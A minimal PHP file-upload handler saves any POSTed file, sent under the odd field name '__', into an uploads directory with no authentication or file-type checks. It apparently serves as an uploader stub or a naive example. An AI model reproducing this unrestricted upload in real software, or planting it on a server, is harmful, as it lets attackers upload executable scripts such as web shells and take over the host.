<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['__'])) {
        $uploadDir = './uploads/';  // Specify the directory where you want to save the uploaded files
        $uploadFile = $uploadDir . basename($_FILES['__']['name']);

        if (move_uploaded_file($_FILES['__']['tmp_name'], $uploadFile)) {
            echo 'OK';
        } else {
            echo 'ER';
        }
    } else {
        echo 'No file uploaded.';
    }
} else {
    echo 'Invalid request.';
}
?>
